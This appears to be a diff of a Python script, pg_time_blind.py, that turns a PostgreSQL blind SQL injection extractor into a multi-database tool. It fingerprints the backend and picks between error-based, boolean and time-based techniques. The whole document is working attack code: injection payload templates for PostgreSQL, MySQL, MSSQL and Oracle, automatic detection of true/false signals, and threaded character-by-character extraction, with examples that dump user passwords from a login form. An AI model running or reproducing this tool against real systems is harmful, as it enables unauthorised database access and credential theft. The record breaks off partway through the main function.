@@ -1,101 +1,166 @@
 #!/usr/bin/env python3
 """
-pg_time_blind.py - Structured PostgreSQL blind SQLi extractor.
+pg_time_blind.py - Structured, multi-DBMS blind SQL injection extractor.
 
-Works against ANY PostgreSQL target with a blind injection, regardless of:
-  - HTTP method (GET / POST / anything)
-  - where the injection lives (URL, body, or a header)
-  - parameter name
-
-It now runs in TWO PHASES:
+Despite the historical name, this tool now handles several DBMS and three blind
+techniques, choosing automatically:
 
   PHASE 1 - DETECTION
-    Auto-discovers (a) the injection CONTEXT (stacked / string-AND / string-OR /
-    numeric-AND / numeric-OR) and (b) the blind TYPE:
-      * BOOLEAN-based  - preferred, because it needs no waiting (fast).
-                         TRUE vs FALSE is told apart by AUTO-CALIBRATION:
-                         the tool sends a known-true and a known-false payload
-                         and diffs status code -> body length -> body text to
-                         pick a reliable discriminator.
-      * TIME-based     - fallback, using pg_sleep() when boolean gives no signal.
+    1. CONTEXT     : finds where/how the injection breaks out
+                     (string vs numeric, AND / OR, stacked).
+    2. DBMS        : fingerprints the backend automatically
+                     (PostgreSQL, MySQL, MSSQL, Oracle).
+    3. TECHNIQUE   : picks the fastest available, preferring
+                       error-based  (one-shot dump via a forced DB error)
+                     > boolean-based (auto-calibrated TRUE/FALSE signal)
+                     > time-based    (sleep oracle, last resort).
 
   PHASE 2 - EXTRACTION
-    Uses whichever oracle was detected. Per character it does a binary search on
-    the ASCII value (~7 requests/char) instead of trying all 95 printable chars.
+    - error-based : leaks the whole value in ONE request (chunked if the DBMS
+                    truncates error text, e.g. MySQL extractvalue ~32 chars).
+    - boolean/time: per-character binary search (~7 requests/char). Boolean
+                    extraction can run concurrently with --threads.
 
-It does NOT depend on sqlmap.
+SAFETY
+  OR-based contexts can change application state (e.g. 'foo' OR 1=1 may match all
+  rows / log you in). They are DISABLED by default; pass --allow-or to include them.
 
 RESUME / MEMORY
-  Progress is checkpointed to a small JSON state file in the current directory
-  after every character. If interrupted (Ctrl+C, dead box, network blip), run
-  the SAME command again to auto-resume. Use --fresh to ignore a checkpoint, or
-  --state PATH to choose the file. The checkpoint is deleted on success.
+  Progress + the detected DBMS/technique/context are checkpointed to a JSON state
+  file after each character. Re-run the SAME command to auto-resume. --fresh to
+  ignore it, --state PATH to choose the file. Deleted automatically on success.
 
-----------------------------------------------------------------------
-HOW IT WORKS
-  You mark the injection point with a placeholder (default: INJECT).
-  Detection figures out the context+type automatically; you can pin them with
-  --context / --force-boolean / --force-time, or supply a custom --template.
+No sqlmap. Only `requests` is required.
 
 ----------------------------------------------------------------------
 EXAMPLES
+  # fully automatic (detect context, DBMS, technique, then extract)
+  python3 pg_time_blind.py -u http://t:3000/login \
+      -d "username=INJECT&password=test" \
+      --query "SELECT password FROM users WHERE username='antwon'"
 
-1) Login form, fully automatic (detect context + type, then extract):
-   python3 pg_time_blind.py \
-     -u http://192.168.245.89:3000/login \
-     -d "username=INJECT&password=test" \
-     --query "SELECT password FROM users WHERE username='antwon'"
+  # reuse a Burp request, force MySQL, allow risky OR contexts
+  python3 pg_time_blind.py --request req.txt --dbms mysql --allow-or \
+      --query "SELECT current_user()"
 
-2) Re-use a saved raw HTTP request file (put INJECT where the payload goes):
-   python3 pg_time_blind.py --request req.txt --query "SELECT current_user"
-
-3) Force time-based, numeric context (skip detection of those):
-   python3 pg_time_blind.py -u "http://target/item?id=INJECT" \
-     --force-time --context numeric-and --query "SELECT version()"
-
-4) Help the boolean calibrator when responses are noisy:
-   python3 pg_time_blind.py -u http://t/login -d "username=INJECT&password=x" \
-     --true-match "Dashboard" --query "SELECT current_user"
+  # speed up boolean extraction with 8 workers
+  python3 pg_time_blind.py -u "http://t/item?id=INJECT" --threads 8 \
+      --query "SELECT version()"
 ----------------------------------------------------------------------
 """
-import sys, os, time, json, hashlib, argparse, re, urllib.parse
+import sys, os, time, json, re, hashlib, argparse, urllib.parse, threading
+from concurrent.futures import ThreadPoolExecutor
 import requests
 
 requests.packages.urllib3.disable_warnings()
 
-
-# ---------------------------------------------------------------------------
-# Injection contexts. Each has a BOOLEAN template (changes the page when the
-# condition is true/false) and/or a TIME template (delays when true).
-#   {cond}  = a SQL boolean condition
-#   {sleep} = seconds to sleep (time templates only)
-# ---------------------------------------------------------------------------
-class Context:
-    def __init__(self, name, bool_tpl, time_tpl):
-        self.name = name
-        self.bool_tpl = bool_tpl
-        self.time_tpl = time_tpl
-
-
-CONTEXTS = [
-    Context("stacked",     None,
-            "';SELECT pg_sleep({sleep}) WHERE {cond}--"),
-    Context("string-and",  "' AND ({cond})--",
-            "' AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--"),
-    Context("string-or",   "' OR ({cond})--",
-            "' OR (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--"),
-    Context("numeric-and", " AND ({cond})--",
-            " AND (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--"),
-    Context("numeric-or",  " OR ({cond})--",
-            " OR (CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1--"),
-]
-CONTEXTS_BY_NAME = {c.name: c for c in CONTEXTS}
-
+DELIM = "QxZx"                      # marker wrapped around error-based leaks
+PROBE = "Prb0"                     # constant used to detect error reflection
 TRUE_COND, FALSE_COND = "1=1", "1=2"
 
 
+# ===========================================================================
+# DBMS adapters - each knows its own SQL dialect.
+# ===========================================================================
+class Dbms:
+    name = "generic"
+    comment = "-- -"               # works for PG / MySQL / MSSQL / Oracle
+    fingerprints = []              # boolean conditions TRUE only on this DBMS
+    stacked = False                # supports ; stacked queries
+    error_trunc = None            # max chars an error reflects (None = unlimited)
+
+    # --- per-character primitives (override per DBMS) ---
+    def length(self, e):  return f"length(({e}))"
+    def substr(self, e, p): return f"substr(({e}),{p},1)"
+    def asc(self, ch):    return f"ascii({ch})"
+
+    # --- time-based payload fragments (return None if unsupported) ---
+    def sleep_inline(self, cond, sleep): return None   # used after AND/OR
+    def sleep_stacked(self, cond, sleep): return None  # used after ';'
+
+    # --- error-based: SQL fragment (after AND/OR) that errors out leaking value
+    def error_expr(self, inner): return None
+    def error_value(self, text):
+        m = re.search(re.escape(DELIM) + "(.*?)" + re.escape(DELIM), text, re.S)
+        return m.group(1) if m else None
+
+
+class Postgres(Dbms):
+    name = "postgresql"
+    stacked = True
+    fingerprints = ["(SELECT 1 FROM pg_catalog.pg_tables LIMIT 1)=1"]
+    def sleep_inline(self, cond, sleep):
+        return f"(CASE WHEN ({cond}) THEN (SELECT 1 FROM pg_sleep({sleep})) ELSE 1 END)=1"
+    def sleep_stacked(self, cond, sleep):
+        return f"SELECT pg_sleep({sleep}) WHERE {cond}"
+    def error_expr(self, inner):
+        return f"1=CAST(('{DELIM}'||({inner})||'{DELIM}') AS int)"
+
+
+class MySQL(Dbms):
+    name = "mysql"
+    stacked = False
+    error_trunc = 30               # extractvalue reflects ~32 chars total (incl ~)
+    fingerprints = ["CONNECTION_ID()>0"]
+    def substr(self, e, p): return f"substring(({e}),{p},1)"
+    def sleep_inline(self, cond, sleep):
+        return f"IF(({cond}),SLEEP({sleep}),0)=0"
+    def error_expr(self, inner):
+        # single leading ~ marker; survives the ~32-char extractvalue truncation
+        return f"extractvalue(1,concat(0x7e,({inner})))"
+    def error_value(self, text):
+        m = re.search(r"~([^'<>\"]+)", text)
+        return m.group(1) if m else None
+
+
+class MSSQL(Dbms):
+    name = "mssql"
+    stacked = True
+    fingerprints = ["@@version LIKE 'Microsoft%'"]
+    def length(self, e):  return f"len(({e}))"
+    def substr(self, e, p): return f"substring(({e}),{p},1)"
+    def sleep_stacked(self, cond, sleep):
+        return f"IF ({cond}) WAITFOR DELAY '0:0:{max(1, int(round(sleep)))}'"
+    def error_expr(self, inner):
+        return f"1=CAST(('{DELIM}'+CAST(({inner}) AS varchar(8000))+'{DELIM}') AS int)"
+
+
+class Oracle(Dbms):
+    name = "oracle"
+    stacked = False
+    fingerprints = ["(SELECT 1 FROM v$version WHERE rownum=1)=1"]
+    # boolean works great; time/error left None (handled via boolean fallback)
+
+
+DBMS_LIST = [Postgres(), MySQL(), MSSQL(), Oracle()]
+DBMS_BY_NAME = {d.name: d for d in DBMS_LIST}
+
+
+# ===========================================================================
+# Injection contexts
+# ===========================================================================
+class Ctx:
+    def __init__(self, name, close, logic, kind):
+        self.name, self.close, self.logic, self.kind = name, close, logic, kind
+
+# kind: "bool" contexts also serve error-based; "stacked" only for time
+BOOL_CONTEXTS = [
+    Ctx("string-and", "'", " AND ", "bool"),
+    Ctx("numeric-and", "", " AND ", "bool"),
+    Ctx("string-or",  "'", " OR ", "bool"),
+    Ctx("numeric-or", "", " OR ", "bool"),
+]
+STACKED_CONTEXT = Ctx("stacked", "'", "", "stacked")
+
+
+def boolean_payload(ctx, cond, comment):
+    return f"{ctx.close}{ctx.logic}({cond}){comment}"
+
+
+# ===========================================================================
+# HTTP transport
+# ===========================================================================
 def parse_request_file(path, proto):
-    """Parse a raw HTTP request file into (method, url, headers, body)."""
     raw = open(path, "r", encoding="utf-8", errors="ignore").read().replace("\r\n", "\n")
     head, _, body = raw.partition("\n\n")
     lines = head.split("\n")
@@ -113,17 +178,14 @@ def parse_request_file(path, proto):
 class Resp:
     __slots__ = ("status", "text", "length", "elapsed")
     def __init__(self, status, text, elapsed):
-        self.status = status
-        self.text = text
-        self.length = len(text)
-        self.elapsed = elapsed
+        self.status, self.text, self.length, self.elapsed = status, text, len(text), elapsed
 
 
 class Target:
-    """Owns the HTTP plumbing: substitute the marker, send, time the response."""
     def __init__(self, a):
         self.a = a
         self.count = 0
+        self._lock = threading.Lock()
         if a.request:
             self.method, self.url, self.headers, self.data = parse_request_file(a.request, a.proto)
         else:
@@ -148,7 +210,8 @@ class Target:
         headers.pop("Content-Length", None)
         if data and not any(k.lower() == "content-type" for k in headers):
             headers["Content-Type"] = "application/x-www-form-urlencoded"
-        self.count += 1
+        with self._lock:
+            self.count += 1
         t = time.time()
         try:
             r = requests.request(self.method, url, data=data, headers=headers,
@@ -156,197 +219,281 @@ class Target:
                                  timeout=self.a.sleep + 20, allow_redirects=False)
         except requests.exceptions.RequestException as e:
             raise SystemExit(f"\n[!] request error: {e}\n"
-                             "    (progress is checkpointed - re-run the same command to resume)")
+                             "    (progress is checkpointed - re-run to resume)")
         return Resp(r.status_code, r.text or "", time.time() - t)
 
 
-# ---------------------------------------------------------------------------
-# Oracles - each answers a single question: "is this SQL condition TRUE?"
-# ---------------------------------------------------------------------------
-class Oracle:
-    def __init__(self, target, ctx, a):
-        self.t = target
-        self.ctx = ctx
-        self.a = a
+# ===========================================================================
+# Oracles - answer "is this SQL condition TRUE?"  (boolean & time)
+# ===========================================================================
+class Oracle_:
+    def __init__(self, target, dbms, ctx, a):
+        self.t, self.dbms, self.ctx, self.a = target, dbms, ctx, a
         self.kind = "?"
-        self.desc = ""
 
-    def fires(self, cond):                 # -> bool ; overridden
-        raise NotImplementedError
+    def fires(self, cond): raise NotImplementedError
 
     def length(self, query):
         for n in range(1, self.a.maxlen + 1):
-            if self.fires(f"length(({query}))={n}"):
+            if self.fires(f"{self.dbms.length(query)}={n}"):
                 return n
         return None
 
     def char(self, query, pos):
         lo, hi = self.a.cmin, self.a.cmax
+        expr = self.dbms.asc(self.dbms.substr(query, pos))
         while lo < hi:
             mid = (lo + hi) // 2
-            if self.fires(f"ascii(substr(({query}),{pos},1))>{mid}"):
+            if self.fires(f"{expr}>{mid}"):
                 lo = mid + 1
             else:
                 hi = mid
         return chr(lo)
 
 
-class TimeOracle(Oracle):
-    def __init__(self, target, ctx, a):
-        super().__init__(target, ctx, a)
-        self.kind = "time-based"
-        self.tpl = a.template or ctx.time_tpl
-        self.thresh = a.threshold if a.threshold else a.sleep * 0.6
-        self.desc = f"context={ctx.name} sleep={a.sleep}s threshold={self.thresh:.2f}s"
-
+class BoolOracle(Oracle_):
+    def __init__(self, target, dbms, ctx, a, classifier, signal):
+        super().__init__(target, dbms, ctx, a)
+        self.kind = "boolean-based"
+        self.classify = classifier
+        self.signal = signal
     def fires(self, cond):
-        payload = self.tpl.format(cond=cond, sleep=self.a.sleep)
+        p = boolean_payload(self.ctx, cond, self.dbms.comment)
+        return self.classify(self.t.send(p))
+
+
+class TimeOracle(Oracle_):
+    def __init__(self, target, dbms, ctx, a):
+        super().__init__(target, dbms, ctx, a)
+        self.kind = "time-based"
+        self.thresh = a.threshold if a.threshold else a.sleep * 0.6
+    def _payload(self, cond):
+        if self.ctx.kind == "stacked":
+            return f"{self.ctx.close};{self.dbms.sleep_stacked(cond, self.a.sleep)}{self.dbms.comment}"
+        return f"{self.ctx.close}{self.ctx.logic}{self.dbms.sleep_inline(cond, self.a.sleep)}{self.dbms.comment}"
+    def fires(self, cond):
         for attempt in range(self.a.retries + 1):
-            slow = self.t.send(payload).elapsed >= self.thresh
+            slow = self.t.send(self._payload(cond)).elapsed >= self.thresh
             if slow and attempt < self.a.retries:
-                continue                    # re-confirm a positive to beat jitter
+                continue
             return slow
         return True
 
 
-class BoolOracle(Oracle):
-    def __init__(self, target, ctx, a, classifier, desc):
-        super().__init__(target, ctx, a)
-        self.kind = "boolean-based"
-        self.tpl = a.template or ctx.bool_tpl
-        self.classify = classifier          # Resp -> bool (True == condition true)
-        self.desc = f"context={ctx.name} signal={desc}"
-
-    def fires(self, cond):
-        payload = self.tpl.format(cond=cond)
-        return self.classify(self.t.send(payload))
-
-
-# ---------------------------------------------------------------------------
-# Detection
-# ---------------------------------------------------------------------------
+# ===========================================================================
+# Calibration (auto TRUE/FALSE signal for boolean)
+# ===========================================================================
 def _stable(vals, jitter):
     return max(vals) - min(vals) <= jitter
 
+def _norm_tokens(text):
+    # drop digit-only tokens so timestamps/counters don't poison token matching
+    return {w for w in re.sub(r"\d+", "#", text).split() if len(w) >= 3}
 
-def calibrate_boolean(target, ctx, a):
-    """Send known-true/false twice each, auto-pick a discriminator.
-    Returns (classifier, description) or None."""
-    # explicit override wins
+def calibrate(target, ctx, a, cond_true=TRUE_COND, cond_false=FALSE_COND):
     if a.true_match:
-        tok = a.true_match
-        return (lambda r: tok in r.text), f"text~'{tok}'"
+        return (lambda r: a.true_match in r.text), f"text~'{a.true_match}'"
     if a.false_match:
-        tok = a.false_match
-        return (lambda r: tok not in r.text), f"!text~'{tok}'"
-
-    T = [target.send(ctx.bool_tpl.format(cond=TRUE_COND)) for _ in range(2)]
-    F = [target.send(ctx.bool_tpl.format(cond=FALSE_COND)) for _ in range(2)]
-
+        return (lambda r: a.false_match not in r.text), f"!text~'{a.false_match}'"
+    T = [target.send(boolean_payload(ctx, cond_true, "-- -")) for _ in range(3)]
+    F = [target.send(boolean_payload(ctx, cond_false, "-- -")) for _ in range(3)]
     # 1) status code
     st_t, st_f = {r.status for r in T}, {r.status for r in F}
     if len(st_t) == 1 and len(st_f) == 1 and st_t != st_f:
         good = st_t.pop()
         return (lambda r, s=good: r.status == s), f"status=={good}"
-
-    # 2) body length (stable within each group, far enough apart)
+    # 2) body length
     lt, lf = [r.length for r in T], [r.length for r in F]
     if _stable(lt, a.len_jitter) and _stable(lf, a.len_jitter):
         ct, cf = sum(lt) / len(lt), sum(lf) / len(lf)
         if abs(ct - cf) >= a.len_margin:
-            mid = (ct + cf) / 2
-            hi_is_true = ct > cf
-            return ((lambda r, m=mid, h=hi_is_true: (r.length > m) == h),
+            mid, hi_true = (ct + cf) / 2, ct > cf
+            return ((lambda r, m=mid, h=hi_true: (r.length > m) == h),
                     f"len~{int(ct)}vs{int(cf)}")
-
-    # 3) a token present in BOTH true responses and NEITHER false response
-    tl_t = [set(r.text.split()) for r in T]
-    tl_f = [set(r.text.split()) for r in F]
-    only_true = (tl_t[0] & tl_t[1]) - (tl_f[0] | tl_f[1])
-    for tok in sorted(only_true, key=len, reverse=True):
-        if len(tok) >= 3:
-            return (lambda r, k=tok: k in r.text), f"text~'{tok}'"
-    only_false = (tl_f[0] & tl_f[1]) - (tl_t[0] | tl_t[1])
-    for tok in sorted(only_false, key=len, reverse=True):
-        if len(tok) >= 3:
-            return (lambda r, k=tok: k not in r.text), f"!text~'{tok}'"
-
+    # 3) digit-stripped token unique to TRUE (or FALSE)
+    tt = [_norm_tokens(r.text) for r in T]
+    tf = [_norm_tokens(r.text) for r in F]
+    only_t = set.intersection(*tt) - set.union(*tf)
+    for tok in sorted(only_t, key=len, reverse=True):
+        return (lambda r, k=tok: k in re.sub(r"\d+", "#", r.text)), f"text~'{tok}'"
+    only_f = set.intersection(*tf) - set.union(*tt)
+    for tok in sorted(only_f, key=len, reverse=True):
+        return (lambda r, k=tok: k not in re.sub(r"\d+", "#", r.text)), f"!text~'{tok}'"
     return None
 
 
-def time_works(target, ctx, a):
-    """True if a true condition delays and a false one doesn't (genuinely timed)."""
-    tpl = ctx.time_tpl
+# ===========================================================================
+# Detection
+# ===========================================================================
+def find_boolean(target, a, contexts):
+    for ctx in contexts:
+        print(f"[*] boolean probe : {ctx.name} ...", flush=True)
+        cal = calibrate(target, ctx, a)
+        if cal:
+            print(f"[+] boolean signal on {ctx.name}: {cal[1]}")
+            return ctx, cal
+    return None, None
+
+def fingerprint_dbms(target, ctx, classifier, a, candidates):
+    """Use the boolean oracle to test each DBMS's unique condition."""
+    for d in candidates:
+        for fp in d.fingerprints:
+            p = boolean_payload(ctx, fp, "-- -")
+            if classifier(target.send(p)):
+                return d
+    return None
+
+def find_time(target, a, contexts, candidates):
+    """Try time payloads across DBMS+contexts; the one that fires reveals the DBMS."""
     thresh = a.threshold if a.threshold else a.sleep * 0.6
-    if target.send(tpl.format(cond=FALSE_COND, sleep=a.sleep)).elapsed >= thresh:
-        return False                         # always slow -> not conditional
-    return target.send(tpl.format(cond=TRUE_COND, sleep=a.sleep)).elapsed >= thresh
+    for d in candidates:
+        ctxs = list(contexts)
+        if d.stacked:
+            ctxs = ctxs + [STACKED_CONTEXT]
+        for ctx in ctxs:
+            if ctx.kind == "stacked" and not d.sleep_stacked(TRUE_COND, a.sleep):
+                continue
+            if ctx.kind != "stacked" and not d.sleep_inline(TRUE_COND, a.sleep):
+                continue
+            print(f"[*] time probe    : {d.name}/{ctx.name} ...", flush=True)
+            o = TimeOracle(target, d, ctx, a)
+            if o.fires(FALSE_COND):          # always-slow? not conditional
+                continue
+            if o.fires(TRUE_COND):
+                print(f"[+] time-based fires: {d.name}/{ctx.name}")
+                return d, ctx
+    return None, None
+
+def find_error(target, dbms, a, contexts):
+    """Detect reflected DB errors -> enables one-shot error-based dump."""
+    if not dbms.error_expr(PROBE):
+        return None
+    for ctx in contexts:
+        if ctx.kind != "bool":
+            continue
+        probe_inner = f"'{PROBE}'"
+        payload = f"{ctx.close}{ctx.logic}{dbms.error_expr(probe_inner)}{dbms.comment}"
+        r = target.send(payload)
+        if dbms.error_value(r.text) and PROBE in r.text:
+            print(f"[+] error reflection on {ctx.name} ({dbms.name})")
+            return ctx
+    return None
+
+
+class Detection:
+    def __init__(self, technique, dbms, ctx, oracle=None, classifier=None, signal="", err_ctx=None):
+        self.technique, self.dbms, self.ctx = technique, dbms, ctx
+        self.oracle, self.classifier, self.signal, self.err_ctx = oracle, classifier, signal, err_ctx
 
 
 def detect(target, a):
-    """Return a ready Oracle, preferring boolean over time. None if nothing fires."""
-    if a.context:
-        contexts = [CONTEXTS_BY_NAME[a.context]]
-    else:
-        contexts = CONTEXTS
+    contexts = list(BOOL_CONTEXTS)
+    if not a.allow_or:
+        contexts = [c for c in contexts if " OR " not in c.logic]
+    candidates = [DBMS_BY_NAME[a.dbms]] if a.dbms else DBMS_LIST
 
-    # custom template short-circuits context discovery
-    if a.template:
-        ctx = contexts[0]
-        if not a.force_time:
-            cal = None
-            if "{sleep}" not in a.template:   # template looks boolean
-                cal = calibrate_boolean_custom(target, a)
-            if cal:
-                return BoolOracle(target, ctx, a, cal[0], cal[1])
-        return TimeOracle(target, ctx, a)
-
-    # 1) BOOLEAN first (fast, no waiting)
+    bool_ctx, cal = (None, None)
     if not a.force_time:
-        for ctx in contexts:
-            if not ctx.bool_tpl:
-                continue
-            print(f"[*] probing boolean   : {ctx.name} ...", flush=True)
-            cal = calibrate_boolean(target, ctx, a)
-            if cal:
-                print(f"[+] boolean signal on {ctx.name}: {cal[1]}")
-                return BoolOracle(target, ctx, a, cal[0], cal[1])
+        bool_ctx, cal = find_boolean(target, a, contexts)
 
-    # 2) TIME fallback
-    if not a.force_boolean:
-        for ctx in contexts:
-            if not ctx.time_tpl:
-                continue
-            print(f"[*] probing time      : {ctx.name} ...", flush=True)
-            if time_works(target, ctx, a):
-                print(f"[+] time-based fires on {ctx.name}")
-                return TimeOracle(target, ctx, a)
+    dbms = candidates[0] if a.dbms else None
+    if bool_ctx and not a.dbms:
+        dbms = fingerprint_dbms(target, bool_ctx, cal[0], a, candidates)
+        if dbms:
+            print(f"[+] DBMS fingerprint: {dbms.name}")
+        else:
+            dbms = Postgres()
+            print("[!] DBMS fingerprint inconclusive -> defaulting to postgresql")
 
+    # no boolean -> try time (also identifies DBMS)
+    time_ctx = None
+    if not bool_ctx and not a.force_boolean:
+        d2, time_ctx = find_time(target, a, contexts, candidates)
+        if d2:
+            dbms = d2
+
+    if not dbms:
+        return None
+
+    # prefer error-based (one-shot) unless forced away
+    if not (a.force_boolean or a.force_time) and not a.no_error:
+        err_ctx = find_error(target, dbms, a, contexts)
+        if err_ctx:
+            return Detection("error-based", dbms, err_ctx, err_ctx=err_ctx)
+
+    if bool_ctx:
+        oracle = BoolOracle(target, dbms, bool_ctx, a, cal[0], cal[1])
+        return Detection("boolean-based", dbms, bool_ctx, oracle=oracle, classifier=cal[0], signal=cal[1])
+    if time_ctx:
+        return Detection("time-based", dbms, time_ctx, oracle=TimeOracle(target, dbms, time_ctx, a))
     return None
 
 
-def calibrate_boolean_custom(target, a):
-    """Calibrate when the user supplied a boolean --template."""
-    if a.true_match:
-        tok = a.true_match
-        return (lambda r: tok in r.text), f"text~'{tok}'"
-    T = [target.send(a.template.format(cond=TRUE_COND)) for _ in range(2)]
-    F = [target.send(a.template.format(cond=FALSE_COND)) for _ in range(2)]
-    st_t, st_f = {r.status for r in T}, {r.status for r in F}
-    if len(st_t) == 1 and len(st_f) == 1 and st_t != st_f:
-        good = st_t.pop()
-        return (lambda r, s=good: r.status == s), f"status=={good}"
-    lt, lf = [r.length for r in T], [r.length for r in F]
-    if _stable(lt, a.len_jitter) and _stable(lf, a.len_jitter) and abs(sum(lt)/2 - sum(lf)/2) >= a.len_margin:
-        ct, cf = sum(lt)/2, sum(lf)/2
-        return ((lambda r, m=(ct+cf)/2, h=(ct > cf): (r.length > m) == h), f"len~{int(ct)}vs{int(cf)}")
-    return None
+# ===========================================================================
+# Extraction
+# ===========================================================================
+def extract_error(target, dbms, ctx, a):
+    """One-shot (or chunked) dump via reflected error."""
+    def leak(inner):
+        p = f"{ctx.close}{ctx.logic}{dbms.error_expr(inner)}{dbms.comment}"
+        return dbms.error_value(target.send(p).text)
+
+    if not dbms.error_trunc:
+        val = leak(f"({a.query})")
+        return val
+    # chunked for DBMS that truncate error text (e.g. MySQL)
+    out, start, chunk = "", 1, dbms.error_trunc
+    while True:
+        piece = leak(f"substring(({a.query}),{start},{chunk})")
+        if piece is None:
+            break
+        out += piece
+        if len(piece) < chunk:
+            break
+        start += chunk
+        if start > a.maxlen:
+            break
+    return out
+
+
+def extract_search(oracle, a, state_path, sig, value="", length=None):
+    q = a.query
+    if length is None:
+        length = oracle.length(q)
+        if length is None:
+            return None
+        save_state(state_path, sig, length, value, oracle.t.count)
+    print(f"[+] length = {length}")
+
+    if a.threads > 1 and oracle.kind == "boolean-based":
+        print(f"[*] extracting with {a.threads} workers ...", flush=True)
+        todo = list(range(len(value) + 1, length + 1))
+        chars = {}
+        with ThreadPoolExecutor(max_workers=a.threads) as ex:
+            for pos, c in zip(todo, ex.map(lambda p: oracle.char(q, p), todo)):
+                chars[pos] = c
+        value += "".join(chars[p] for p in sorted(chars))
+        save_state(state_path, sig, length, value, oracle.t.count)
+        return value
+
+    print(f"[*] extracting: {value}", end="", flush=True)
+    try:
+        for pos in range(len(value) + 1, length + 1):
+            value += oracle.char(q, pos)
+            save_state(state_path, sig, length, value, oracle.t.count)
+            sys.stdout.write(value[-1]); sys.stdout.flush()
+    except KeyboardInterrupt:
+        save_state(state_path, sig, length, value, oracle.t.count)
+        print(f"\n\n[!] interrupted - progress saved to {state_path}; re-run to resume.")
+        sys.exit(130)
+    print()
+    return value
 
 
 # ---------------------------- resume / checkpoint ----------------------------
-def job_signature(a, oracle):
-    raw = "|".join([oracle.t.method, oracle.t.url or "", oracle.t.data or "",
-                    oracle.kind, oracle.ctx.name, a.query,
+def job_signature(a, det, target):
+    raw = "|".join([target.method, target.url or "", target.data or "",
+                    det.technique, det.dbms.name, det.ctx.name, a.query,
                     str(a.sleep), str(a.cmin), str(a.cmax)])
     return hashlib.sha1(raw.encode()).hexdigest()[:10]
 
@@ -367,46 +514,44 @@ def save_state(path, sig, length, value, count):
 
 
 def main():
-    ap = argparse.ArgumentParser(description="Structured PostgreSQL blind SQLi extractor (boolean + time)")
+    ap = argparse.ArgumentParser(description="Structured multi-DBMS blind SQLi extractor (error/boolean/time)")
     src = ap.add_argument_group("target (use -u/-d/-H  OR  --request)")
-    src.add_argument("-u", "--url", help="URL (may contain the marker for GET injection)")
-    src.add_argument("-d", "--data", help="request body (may contain the marker)")
-    src.add_argument("-H", "--header", action="append", help="extra header 'Name: value' (repeatable; may contain marker)")
-    src.add_argument("-X", "--method", help="HTTP method (default: POST if -d given else GET)")
-    src.add_argument("--request", help="raw HTTP request file with the marker inside")
-    src.add_argument("--proto", default="http", help="proto for --request file (default http)")
+    src.add_argument("-u", "--url"); src.add_argument("-d", "--data")
+    src.add_argument("-H", "--header", action="append")
+    src.add_argument("-X", "--method"); src.add_argument("--request")
+    src.add_argument("--proto", default="http")
 
     inj = ap.add_argument_group("injection")
-    inj.add_argument("--query", required=True, help="SQL scalar to extract, e.g. \"SELECT password FROM users WHERE username='bob'\"")
-    inj.add_argument("--marker", default="INJECT", help="placeholder for the injection point (default INJECT)")
-    inj.add_argument("--template", help="custom payload template using {cond} (+ {sleep} for time)")
-    inj.add_argument("--no-encode", dest="encode", action="store_false", help="do NOT url-encode the payload")
+    inj.add_argument("--query", required=True, help="SQL scalar to extract")
+    inj.add_argument("--marker", default="INJECT")
+    inj.add_argument("--no-encode", dest="encode", action="store_false")
 
     det = ap.add_argument_group("detection")
-    det.add_argument("--context", choices=list(CONTEXTS_BY_NAME), help="pin the injection context (skip context discovery)")
-    det.add_argument("--force-boolean", action="store_true", help="only use boolean-based blind")
-    det.add_argument("--force-time", action="store_true", help="only use time-based blind")
-    det.add_argument("--true-match", help="string present ONLY in a TRUE response (overrides auto-calibration)")
-    det.add_argument("--false-match", help="string present ONLY in a FALSE response (overrides auto-calibration)")
-    det.add_argument("--len-margin", type=int, default=12, help="min body-length gap to treat as a boolean signal (default 12)")
-    det.add_argument("--len-jitter", type=int, default=4, help="allowed body-length wobble within one response type (default 4)")
+    det.add_argument("--dbms", choices=list(DBMS_BY_NAME), help="pin the DBMS (skip fingerprinting)")
+    det.add_argument("--force-boolean", action="store_true")
+    det.add_argument("--force-time", action="store_true")
+    det.add_argument("--no-error", action="store_true", help="don't use error-based even if available")
+    det.add_argument("--allow-or", action="store_true", help="include risky OR contexts (may change app state)")
+    det.add_argument("--true-match", help="string only in a TRUE response (overrides calibration)")
+    det.add_argument("--false-match", help="string only in a FALSE response")
+    det.add_argument("--len-margin", type=int, default=12)
+    det.add_argument("--len-jitter", type=int, default=4)
 
     tun = ap.add_argument_group("tuning")
-    tun.add_argument("--sleep", type=float, default=3.0, help="pg_sleep seconds for time-based (default 3)")
-    tun.add_argument("--threshold", type=float, default=0.0, help="seconds to count as 'slept' (default sleep*0.6)")
-    tun.add_argument("--retries", type=int, default=1, help="re-confirm a time positive N times (default 1)")
-    tun.add_argument("--maxlen", type=int, default=64, help="max length to probe (default 64)")
-    tun.add_argument("--cmin", type=int, default=32, help="min ASCII for binary search (default 32)")
-    tun.add_argument("--cmax", type=int, default=126, help="max ASCII for binary search (default 126)")
-    tun.add_argument("--proxy", help="e.g. http://127.0.0.1:8080")
+    tun.add_argument("--sleep", type=float, default=3.0)
+    tun.add_argument("--threshold", type=float, default=0.0)
+    tun.add_argument("--retries", type=int, default=1)
+    tun.add_argument("--threads", type=int, default=1, help="parallel workers for boolean extraction")
+    tun.add_argument("--maxlen", type=int, default=64)
+    tun.add_argument("--cmin", type=int, default=32)
+    tun.add_argument("--cmax", type=int, default=126)
+    tun.add_argument("--proxy")
 
-    res = ap.add_argument_group("resume / memory")
-    res.add_argument("--state", help="checkpoint file path (default: auto-named .pgtb-<id>.json)")
-    res.add_argument("--fresh", action="store_true", help="ignore any existing checkpoint and start over")
+    res = ap.add_argument_group("resume")
+    res.add_argument("--state"); res.add_argument("--fresh", action="store_true")
 
     ap.set_defaults(encode=True)
     a = ap.parse_args()
-
     if not a.request and not a.url:
         ap.error("provide -u/--url (with -d/-H) or --request")
     if a.force_boolean and a.force_time:
@@ -415,49 +560,41 @@ def main():
     target = Target(a)
 
     print("=== PHASE 1: detection ===")
-    oracle = detect(target, a)
-    if not oracle:
+    det = detect(target, a)
+    if not det:
         print("\n[!] no blind injection detected.")
-        print("    try: a different --context, --force-time, --true-match, or check the marker placement.")
+        print("    try --allow-or, --dbms, --force-time, --true-match, or check marker placement.")
         sys.exit(1)
-    print(f"\n[+] TYPE   : {oracle.kind}")
-    print(f"[+] DETAIL : {oracle.desc}")
